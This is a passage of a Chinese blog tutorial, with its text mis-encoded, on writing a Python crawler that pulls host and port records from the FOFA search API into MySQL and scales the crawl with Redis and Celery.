title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>è¯­è¨€ï¼špython2.7</p><p>ä¸­é—´ä»¶ï¼šMySQL</p><p>ç¬¬ä¸‰æ–¹åŒ…ï¼špymysql/requests/</p><p>åœºæ™¯ï¼šå°è§„æ¨¡çˆ¬è™«/ä¸€èˆ¬çˆ¬è™«</p><p>é€šè¿‡æŸ¥çœ‹FOFA APIå¯ä»¥å¾—çŸ¥è¯·æ±‚åœ°å€å’Œå‚æ•°ï¼Œå¼€å±€ä¸€å¥è¯åŠŸèƒ½å…¨é ç¼–ã€‚</p><h3 id="è¯·æ±‚ä¸­å¿ƒ"><a href="#è¯·æ±‚ä¸­å¿ƒ" class="headerlink" title="è¯·æ±‚ä¸­å¿ƒ"></a>è¯·æ±‚ä¸­å¿ƒ</h3><p>åœ¨å‘é€å¤§é‡çš„httpè¯·æ±‚æ—¶æœ€å¥½ä½¿ç”¨ç»Ÿä¸€çš„HTTPè¯·æ±‚ä¸­å¿ƒï¼Œæ–¹ä¾¿æ§åˆ¶ï¼Œä»£ç é‡å¤åˆ©ç”¨ï¼Œæé«˜æ•ˆç‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line"><span class="comment"># è¯·æ±‚å¤´</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">è¯·æ±‚ä¸­å¿ƒï¼Œæ§åˆ¶ç¨‹åºæ‰€æœ‰HTTPè¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚å‘ç”Ÿé”™è¯¯è¿›è¡Œå°è¯•å†æ¬¡è¿æ¥</span></span><br><span class="line"><span class="string">@param url è¯·æ±‚è¿æ¥</span></span><br><span class="line"><span class="string">@return è¯·æ±‚å“åº”ç»“æœ</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fofa_requests</span><span class="params">(url)</span>:</span></span><br><span class="line">    rs_content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rs = session.get(api_url, verify=<span class="keyword">False</span>,headers=headers)</span><br><span class="line">            rs_text = rs.text</span><br><span class="line">            results = json.loads(rs_text)</span><br><span class="line">            total_size = results[<span class="string">'size'</span>]</span><br><span class="line">            error = results</span><br><span class="line">            <span class="keyword">if</span> results[<span class="string">'error'</span>] <span class="keyword">and</span> <span class="string">'None'</span> <span class="keyword">not</span> <span class="keyword">in</span> results[<span class="string">'error'</span>]:</span><br><span class="line">                info = <span class="string">u'fofa é”™è¯¯:'</span>+results[<span class="string">'error'</span>]+<span class="string">u' ä¼‘çœ 30s'</span></span><br><span class="line">                logging.error(info)</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rs_content = results</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">u'fofa é”™è¯¯:'</span>+str(e.message)+<span class="string">u' ä¼‘çœ 30s'</span>)</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            time.sleep(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> rs_content</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®åº“å­˜å‚¨"><a href="#æ•°æ®åº“å­˜å‚¨" class="headerlink" title="æ•°æ®åº“å­˜å‚¨"></a>æ•°æ®åº“å­˜å‚¨</h3><p>æœ‰äº†ç»Ÿä¸€çš„è¯·æ±‚ä¸­å¿ƒæ¥ä¸‹æ¥å°±è¯¥ç¼–å†™å…¥åº“ä»£ç ï¼Œå°†çˆ¬è™«ç»“æœå­˜å…¥æ•°æ®åº“ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">æ‰¹é‡æ•°æ®å­˜å…¥æ•°æ®åº“</span></span><br><span class="line"><span class="string">@param results </span></span><br><span class="line"><span class="string">@param page_no å½“å‰é¡µæ•°</span></span><br><span class="line"><span class="string">@param page_total æ€»é¡µæ•°</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">batch_insert_db</span><span class="params">(results,page_no,page_total,fofa_sql)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Z = []</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            a = (str(result[<span class="number">0</span>]),str(result[<span class="number">1</span>]),str(result[<span class="number">2</span>]),str(result[<span class="number">3</span>]),str(result[<span class="number">4</span>]),str(result[<span class="number">5</span>]),str(result[<span class="number">6</span>]),pymysql.escape_string(fofa_sql))</span><br><span class="line">            Z.append(a)</span><br><span class="line">        sql = <span class="string">"INSERT IGNORE INTO fofa_spider(id,host,ip,port,protocol,country_name,region_name,city_name,fofa_sql,create_date,update_date) VALUES(DEFAULT,%s,%s,%s,%s,%s,%s,%s,%s,NOW(),NOW())"</span></span><br><span class="line">        cursor.executemany(sql, Z)</span><br><span class="line">        connection.commit()</span><br><span class="line">        logging.info(<span class="string">u'å­˜å…¥æ•°æ®åº“ok,æ€»æ•°é‡ä¸º:'</span>+str(len(Z))+<span class="string">u', page--&gt; '</span>+str(page_no)+<span class="string">'/'</span>+str(page_total))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">u"å­˜å…¥æ•°æ®åº“é”™è¯¯,é”™è¯¯ä¿¡æ¯:"</span>+e.message)</span><br><span class="line">        traceback.print_exc()</span><br></pre></td></tr></table></figure><h3 id="æ ¸å¿ƒä¸šåŠ¡ä»£ç "><a href="#æ ¸å¿ƒä¸šåŠ¡ä»£ç " class="headerlink" title="æ ¸å¿ƒä¸šåŠ¡ä»£ç "></a>æ ¸å¿ƒä¸šåŠ¡ä»£ç </h3><p>å¯ä»¥å­˜å…¥æ•°æ®åº“ä¸­å°±è¯¥å†™æ ¸å¿ƒçš„å‡½æ•°é€»è¾‘å‡½æ•°ï¼Œè¾“å…¥å‚æ•°ä»…ä¸ºFOFAæ£€ç´¢è¯­å¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fofa çˆ¬è™«ä¸»å‡½æ•°</span></span><br><span class="line"><span class="string">@param fofa_sql fofaæŸ¥è¯¢è¯­å¥</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(fofa_sql)</span>:</span></span><br><span class="line">    base64_str = base64.b64encode(fofa_sql)</span><br><span class="line">    fields_str = <span class="string">','</span>.join(fields)</span><br><span class="line">    api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_start)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">    rs = fofa_requests(api_url)</span><br><span class="line">    total_size = rs[<span class="string">'size'</span>]</span><br><span class="line">    <span class="comment"># è®¡ç®—é¡µæ•°</span></span><br><span class="line">    page_end = total_size / page_size + <span class="number">1</span> <span class="keyword">if</span> total_size % page_size != <span class="number">0</span> <span class="keyword">else</span> total_size / page_size</span><br><span class="line">    <span class="comment"># å­˜å…¥u æ•°æ®åº“</span></span><br><span class="line">    batch_insert_db(rs[<span class="string">'results'</span>],page_start,page_end,fofa_sql)</span><br><span class="line">    <span class="keyword">for</span> page_no <span class="keyword">in</span> range(<span class="number">1</span>,page_end+<span class="number">1</span>):</span><br><span class="line">        api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_no)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">        batch_insert_db(rs[<span class="string">'results'</span>],page_start,page_end,fofa_sql)</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¿è¡Œç»“æœï¼š</p><p><img src="/posts/f5ba6079/WX20190301-210151@2x.png" alt="è¿è¡Œç»“æœ"></p><p>å®Œæ•´ä»£ç åœ°å€ï¼š<a href="https://github.com/0nise/scripts/blob/master/fofa_spider.py" target="_blank" rel="noopener">https://github.com/0nise/scripts/blob/master/fofa_spider.py</a></p><p>æ³¨ï¼šè¿è¡Œè„šæœ¬ä¹‹å‰å…ˆé…ç½®ç›¸å…³é…ç½®ä¿¡æ¯ï¼ˆæ•°æ®åº“/FOFAä¿¡æ¯ï¼‰</p><h2 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a>è¿›é˜¶</h2><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p>é’ˆå¯¹ä¸€èˆ¬çš„æ•°æ®çˆ¬è™«æ•°æ®çˆ¬è™«ï¼Œä¸Šè¿°æ–¹æ³•å¯ä»¥å®Œç¾é€‚åº”ã€‚ä½†å¦‚æœéœ€è¦çˆ¬è™«çš„æ˜¯ä¸ºåƒä¸‡çº§åˆ«è§„æ¨¡çš„æ•°æ®ä¸Šè¿°æ–¹æ³•å°±æ˜¾å¾—æœ‰ç‚¹ä¸è¡Œäº†ï¼Œè§£å†³æ–¹æ¡ˆæœ‰ä¸€èˆ¬æœ‰å¤šçº¿ç¨‹/å¤šè¿›ç¨‹/åç¨‹ç­‰ã€‚</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é’ˆå¯¹å¤§è§„æ¨¡æ•°æ®çˆ¬è™«ï¼Œå¾ˆå¤šäººæƒ³åˆ°çš„æ˜¯å¤šçº¿ç¨‹/å¤šè¿›ç¨‹/åç¨‹ç­‰æ–¹æ¡ˆï¼Œä½†æ˜¯è¿™äº›æ–¹æ¡ˆçš„å¯æ‰©å±•å¹¶ä¸æ˜¯å¾ˆå¼ºï¼Œå¦‚æœéœ€è¦è°ƒæ•´å·¥å…·éœ€è¦åœæ­¢ç¨‹åºä¿®æ”¹ç¨‹åºç­‰ï¼Œè¿™é‡Œæˆ‘çš„æ€è·¯æ˜¯ä½¿ç”¨ç”Ÿäº§è€…å’Œæ¶ˆè´¹çš„æ€è·¯æ¥å¤„ç†ã€‚åªéœ€è¦å¯¹ä¸Šè¿°çš„ä»£ç åšè½»å¾®ä¿®æ”¹å°±å¯ä»¥å®Œç¾çš„é€‚åº”å¤§è§„æ¨¡æ•°æ®çˆ¬è™«ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨redis+celeryçš„æ–¹å¼æ¥å®ç°ã€‚</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p> Redisæ˜¯ä¸€æ¬¾å¼€æºçš„ã€é«˜æ€§èƒ½çš„é”®-å€¼å­˜å‚¨ï¼ˆkey-value storeï¼‰ã€‚å®ƒå¸¸è¢«ç§°ä½œæ˜¯ä¸€æ¬¾æ•°æ®ç»“æ„æœåŠ¡å™¨ï¼ˆdata structure serverï¼‰ã€‚</p><p>Redisçš„é”®å€¼å¯ä»¥åŒ…æ‹¬å­—ç¬¦ä¸²ï¼ˆstringsï¼‰ç±»å‹ï¼ŒåŒæ—¶å®ƒè¿˜åŒ…æ‹¬å“ˆå¸Œï¼ˆhashesï¼‰ã€åˆ—è¡¨ï¼ˆlistsï¼‰ã€é›†åˆï¼ˆsetsï¼‰å’Œ æœ‰åºé›†åˆï¼ˆsorted setsï¼‰ç­‰æ•°æ®ç±»å‹ã€‚ å¯¹äºè¿™äº›æ•°æ®ç±»å‹ï¼Œä½ å¯ä»¥æ‰§è¡ŒåŸå­æ“ä½œã€‚ä¾‹å¦‚ï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œé™„åŠ æ“ä½œï¼ˆappendï¼‰ï¼›é€’å¢å“ˆå¸Œä¸­çš„å€¼ï¼›å‘åˆ—è¡¨ä¸­å¢åŠ å…ƒç´ ï¼›è®¡ç®—é›†åˆçš„äº¤é›†ã€å¹¶é›†ä¸å·®é›†ç­‰ã€‚</p><p>ä¸ºäº†è·å¾—ä¼˜å¼‚çš„æ€§èƒ½ï¼ŒRedisé‡‡ç”¨äº†å†…å­˜ä¸­ï¼ˆin-memoryï¼‰æ•°æ®é›†ï¼ˆdatasetï¼‰çš„æ–¹å¼ã€‚åŒæ—¶ï¼ŒRedisæ”¯æŒæ•°æ®çš„æŒä¹…åŒ–ï¼Œä½ å¯ä»¥æ¯éš”ä¸€æ®µæ—¶é—´å°†æ•°æ®é›†è½¬å­˜åˆ°ç£ç›˜ä¸Šï¼ˆsnapshotï¼‰ï¼Œæˆ–è€…åœ¨æ—¥å¿—å°¾éƒ¨è¿½åŠ æ¯ä¸€æ¡æ“ä½œå‘½ä»¤ï¼ˆappend only file,aofï¼‰ã€‚</p><p>RedisåŒæ ·æ”¯æŒä¸»ä»å¤åˆ¶ï¼ˆmaster-slave replicationï¼‰ï¼Œå¹¶ä¸”å…·æœ‰éå¸¸å¿«é€Ÿçš„éé˜»å¡é¦–æ¬¡åŒæ­¥ï¼ˆ non-blocking first synchronizationï¼‰ã€ç½‘ç»œæ–­å¼€è‡ªåŠ¨é‡è¿ç­‰åŠŸèƒ½ã€‚åŒæ—¶Redisè¿˜å…·æœ‰å…¶å®ƒä¸€äº›ç‰¹æ€§ï¼Œå…¶ä¸­åŒ…æ‹¬ç®€å•çš„äº‹ç‰©æ”¯æŒã€å‘å¸ƒè®¢é˜… ï¼ˆ pub/subï¼‰ã€ç®¡é“ï¼ˆpipelineï¼‰å’Œè™šæ‹Ÿå†…å­˜ï¼ˆvmï¼‰ç­‰ ã€‚<br>Rediså…·æœ‰ä¸°å¯Œçš„å®¢æˆ·ç«¯ï¼Œæ”¯æŒç°é˜¶æ®µæµè¡Œçš„å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ã€‚</p><h3 id="celery"><a href="#celery" class="headerlink" title="celery"></a>celery</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>Celeryï¼ˆèŠ¹èœï¼‰æ˜¯ä¸€ä¸ªç®€å•ã€çµæ´»ä¸”å¯é çš„ï¼Œå¤„ç†å¤§é‡æ¶ˆæ¯çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¹¶ä¸”æä¾›ç»´æŠ¤è¿™æ ·ä¸€ä¸ªç³»ç»Ÿçš„å¿…éœ€å·¥å…·ã€‚</p><h6 id="ä»»åŠ¡é˜Ÿåˆ—"><a href="#ä»»åŠ¡é˜Ÿåˆ—" class="headerlink" title="ä»»åŠ¡é˜Ÿåˆ—"></a>ä»»åŠ¡é˜Ÿåˆ—</h6><p>ä»»åŠ¡é˜Ÿåˆ—æ˜¯ä¸€ç§åœ¨çº¿ç¨‹æˆ–æœºå™¨é—´åˆ†å‘ä»»åŠ¡çš„æœºåˆ¶ã€‚</p><h6 id="æ¶ˆæ¯é˜Ÿåˆ—"><a href="#æ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—"></a>æ¶ˆæ¯é˜Ÿåˆ—</h6><p>æ¶ˆæ¯é˜Ÿåˆ—çš„è¾“å…¥æ˜¯å·¥ä½œçš„ä¸€ä¸ªå•å…ƒï¼Œç§°ä¸ºä»»åŠ¡ï¼Œç‹¬ç«‹çš„èŒç¨‹ï¼ˆWorkerï¼‰è¿›ç¨‹æŒç»­ç›‘è§†é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰éœ€è¦å¤„ç†çš„æ–°ä»»åŠ¡ã€‚</p><p>Celery ç”¨æ¶ˆæ¯é€šä¿¡ï¼Œé€šå¸¸ä½¿ç”¨ä¸­é—´äººï¼ˆBrokerï¼‰åœ¨å®¢æˆ·ç«¯å’ŒèŒç¨‹é—´æ–¡æ—‹ã€‚è¿™ä¸ªè¿‡ç¨‹ä»å®¢æˆ·ç«¯å‘é˜Ÿåˆ—æ·»åŠ æ¶ˆæ¯å¼€å§‹ï¼Œä¹‹åä¸­é—´äººæŠŠæ¶ˆæ¯æ´¾é€ç»™èŒç¨‹ï¼ŒèŒç¨‹å¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/posts/f5ba6079/1018261-20161017182409279-50086417.png" alt="1018261-20161017182409279-50086417"><br>Celery ç³»ç»Ÿå¯åŒ…å«å¤šä¸ªèŒç¨‹å’Œä¸­é—´äººï¼Œä»¥æ­¤è·å¾—é«˜å¯ç”¨æ€§å’Œæ¨ªå‘æ‰©å±•èƒ½åŠ›ã€‚</p><h4 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h4><p>Celeryçš„æ¶æ„ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œæ¶ˆæ¯ä¸­é—´ä»¶ï¼ˆmessage brokerï¼‰ï¼Œä»»åŠ¡æ‰§è¡Œå•å…ƒï¼ˆworkerï¼‰å’Œä»»åŠ¡æ‰§è¡Œç»“æœå­˜å‚¨ï¼ˆtask result storeï¼‰ç»„æˆã€‚</p><h5 id="æ¶ˆæ¯ä¸­é—´ä»¶"><a href="#æ¶ˆæ¯ä¸­é—´ä»¶" class="headerlink" title="æ¶ˆæ¯ä¸­é—´ä»¶"></a>æ¶ˆæ¯ä¸­é—´ä»¶</h5><p>Celeryæœ¬èº«ä¸æä¾›æ¶ˆæ¯æœåŠ¡ï¼Œä½†æ˜¯å¯ä»¥æ–¹ä¾¿çš„å’Œç¬¬ä¸‰æ–¹æä¾›çš„æ¶ˆæ¯ä¸­é—´ä»¶é›†æˆï¼ŒåŒ…æ‹¬ï¼Œ<a href="http://rabbitmq.com/" target="_blank" rel="noopener">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="noopener">Redis</a>,<a href="http://mongodb.org/" target="_blank" rel="noopener">MongoDB</a>ç­‰ï¼Œè¿™é‡Œæˆ‘å…ˆå»äº†è§£<a href="http://rabbitmq.com/" target="_blank" rel="noopener">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="noopener">Redis</a>ã€‚</p><h5 id="ä»»åŠ¡æ‰§è¡Œå•å…ƒ"><a href="#ä»»åŠ¡æ‰§è¡Œå•å…ƒ" class="headerlink" title="ä»»åŠ¡æ‰§è¡Œå•å…ƒ"></a>ä»»åŠ¡æ‰§è¡Œå•å…ƒ</h5><p>Workeræ˜¯Celeryæä¾›çš„ä»»åŠ¡æ‰§è¡Œçš„å•å…ƒï¼Œworkerå¹¶å‘çš„è¿è¡Œåœ¨åˆ†å¸ƒå¼çš„ç³»ç»ŸèŠ‚ç‚¹ä¸­</p><h5 id="ä»»åŠ¡ç»“æœå­˜å‚¨"><a href="#ä»»åŠ¡ç»“æœå­˜å‚¨" class="headerlink" title="ä»»åŠ¡ç»“æœå­˜å‚¨"></a>ä»»åŠ¡ç»“æœå­˜å‚¨</h5><p>Task result storeç”¨æ¥å­˜å‚¨Workeræ‰§è¡Œçš„ä»»åŠ¡çš„ç»“æœï¼ŒCeleryæ”¯æŒä»¥ä¸åŒæ–¹å¼å­˜å‚¨ä»»åŠ¡çš„ç»“æœï¼ŒåŒ…æ‹¬Redisï¼ŒMongoDBï¼ŒDjango ORMï¼ŒAMQPç­‰ï¼Œè¿™é‡Œæˆ‘å…ˆä¸å»çœ‹å®ƒæ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Œå°±å…ˆé€‰ç”¨Redisæ¥å­˜å‚¨ä»»åŠ¡æ‰§è¡Œç»“æœã€‚</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="http://docs.celeryproject.org/en/latest/" target="_blank" rel="noopener">http://docs.celeryproject.org/en/latest/</a><br>ä¸­æ–‡ç¬”è®°ï¼š<a href="http://www.cnblogs.com/forward-wang/p/5970806.html" target="_blank" rel="noopener">http://www.cnblogs.com/forward-wang/p/5970806.html</a></p><h3 id="ä¿®æ”¹"><a href="#ä¿®æ”¹" class="headerlink" title="ä¿®æ”¹"></a>ä¿®æ”¹</h3><p>ä¸Šé¢çœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼Œä¼šç”¨å°±è¡Œã€‚</p><p><img src="/posts/f5ba6079/1500286923_459579.jpg" alt=""></p><p>æ·»åŠ celeryé…ç½®ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Celery</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> platforms,Celery</span><br><span class="line">platforms.C_FORCE_ROOT =  <span class="keyword">True</span></span><br><span class="line"><span class="comment"># Redisè¿æ¥åœ°å€ï¼Œå¦‚æœä¸ºæœ¬æœºä¸éœ€è¦åšä¿®æ”¹</span></span><br><span class="line">broker =  <span class="string">'redis://127.0.0.1:6379/0'</span></span><br><span class="line">app = Celery(<span class="string">'fofa_spider'</span>,broker=broker)</span><br></pre></td></tr></table></figure><p>æ·»åŠ æ ¸å¿ƒå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">celery çˆ¬è™«</span></span><br><span class="line"><span class="string">@param api_url çˆ¬è™«URL</span></span><br><span class="line"><span class="string">@param fofa_sql FOFAè¯­å¥</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">celery_spider</span><span class="params">(api_url,fofa_sql)</span>:</span></span><br><span class="line">    rs = fofa_requests(api_url)</span><br><span class="line">    batch_insert_db(rs[<span class="string">'results'</span>],fofa_sql)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸šåŠ¡é€»è¾‘ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fofa çˆ¬è™«ä¸»å‡½æ•°</span></span><br><span class="line"><span class="string">@param fofa_sql fofaæŸ¥è¯¢è¯­å¥</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(fofa_sql)</span>:</span></span><br><span class="line">    base64_str = base64.b64encode(fofa_sql)</span><br><span class="line">    fields_str = <span class="string">','</span>.join(fields)</span><br><span class="line">    api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_start)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">    rs = fofa_requests(api_url)</span><br><span class="line">    total_size = rs[<span class="string">'size'</span>]</span><br><span class="line">    <span class="comment"># è®¡ç®—é¡µæ•°</span></span><br><span class="line">    page_end = total_size / page_size + <span class="number">1</span> <span class="keyword">if</span> total_size % page_size != <span class="number">0</span> <span class="keyword">else</span> total_size / page_size</span><br><span class="line">    <span class="comment"># å­˜å…¥æ•°æ®åº“</span></span><br><span class="line">    batch_insert_db(rs[<span class="string">'results'</span>],fofa_sql)</span><br><span class="line">    <span class="keyword">for</span> page_no <span class="keyword">in</span> range(<span class="number">1</span>,page_end+<span class="number">1</span>):</span><br><span class="line">        api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_no)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">        logging.info(<span class="string">'send task --&gt;'</span>+api_url)</span><br><span class="line">        celery_spider.delay(api_url,fofa_sql)</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç åœ°å€ï¼š<a href="https://github.com/0nise/scripts/blob/master/fofa_spider_ext.py" target="_blank" rel="noopener">https://github.com/0nise/scripts/blob/master/fofa_spider_ext.py</a></p><h3 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h3><ul><li>è¿è¡Œ<code>python fofa_spider_ext.py</code>å‘é€éœ€è¦çˆ¬è™«çš„ä»»åŠ¡ä¿¡æ¯</li><li>è¿è¡Œ<code>celery -A fofa_spider_ext worker -l info</code> è¿›è¡Œæ¶ˆè´¹çˆ¬è™«</li></ul><p>è¿è¡ŒæˆåŠŸ</p><p><img src="/posts/f5ba6079/WX20190301-220619@2x.png" alt="celeryè¿è¡ŒæˆåŠŸ"></p><p>æ•°æ®åº“ä¿¡æ¯</p><p><img src="/posts/f5ba6079/WX20190301-220757@2x.png" alt="æ•°æ®åº“å­˜å…¥æ•°æ®"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="http://www.cnblogs.com/forward-wang/p/5970806.html" target="_blank" rel="noopener">Celery æ¡†æ¶å­¦ä¹ ç¬”è®°</a></li><li><a href="https://www.cnblogs.com/yuhangwang/p/5817930.html" target="_blank" rel="noopener">Rediså…¥é—¨è¯¦è§£</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ€è¿‘å› é¡¹ç›®éœ€è¦ï¼Œéœ€è¦çˆ¬è™«FOFAé‡Œé¢æ•°æ®è¿›è¡Œæ•°æ®ç»Ÿè®¡åˆ†æï¼Œå› æ­¤å°±æœ‰äº†æœ¬ç¯‡æ–‡ç« ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h2&gt;&lt;p&gt;æè¿°ç¯å¢ƒä¸ºæ–‡ç« ä¸­æ‰€ç”¨åˆ°çš„æ‰€æœ‰æŠ€æœ¯ä»¥åŠä¸­é—´ä»¶å¹¶é
      
    
    </summary>
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/categories/FOFA-Pro/"/>
    
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/tags/FOFA-Pro/"/>
    
      <category term="çˆ¬è™«" scheme="http://www.r4v3zn.com/tags/%E7%88%AC%E8%99%AB/"/>
    
